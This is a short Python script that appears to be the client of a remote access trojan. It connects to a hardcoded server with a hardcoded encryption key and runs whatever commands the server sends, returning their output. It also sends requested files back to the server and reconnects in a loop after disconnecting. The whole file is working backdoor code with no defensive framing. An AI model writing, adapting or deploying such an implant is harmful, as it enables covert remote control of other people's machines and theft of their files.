from core.connect import  connect
from core.command import command
from core.crypter import cryptMsg
from core.file import filestream
import time

def main():
	try:
		ip = '127.0.0.1'
		port = 8080
		key = 'this is my key b'
		deli = '<end_of_data>'
		con = connect(ip , port)
		crypter = cryptMsg(key)
		comm = command()
		con.send_serv(crypter.encrypt(comm.get_data() + deli))
		while True :
			comm.flush_cmd()
			data = ''
			cmd = crypter.decrypt(con.recv_serv())
			print(cmd)
			if cmd == '' :
				continue
			elif cmd.find('cd', 0 , 2) != -1 :
				comp = cmd.split()
				comm.change_dir(comp[1])
				data = comp[1]
			elif cmd.find('upload', 0 , 6) != -1:
				print('uploading')
				continue
			elif cmd.find('download', 0 , 8) != -1:
				comp = cmd.split()
				data = comm.download(comp[1])
				if data == False:
					data = 'file not found'
				else:
					fs = filestream(comp[1], 'rb')
					data = fs.read()
					while len(data) > 0 :
						con.send_serv(data)
						data = fs.read()
					con.send_serv(data +  deli.encode())
					fs.close()
					del fs
				continue
			elif cmd == 'exit' :
				data = 'bye'
			else:
				data = comm.get_data(cmd)
			print(data)
			con.send_serv(crypter.encrypt(data + deli))
			if data.find('bye') != -1:
				break
		con.close_serv()
		time.sleep(10)
		main()
	except NameError as e:
		print('connection error ' ,e.args[0])

if __name__ == '__main__':
	main()

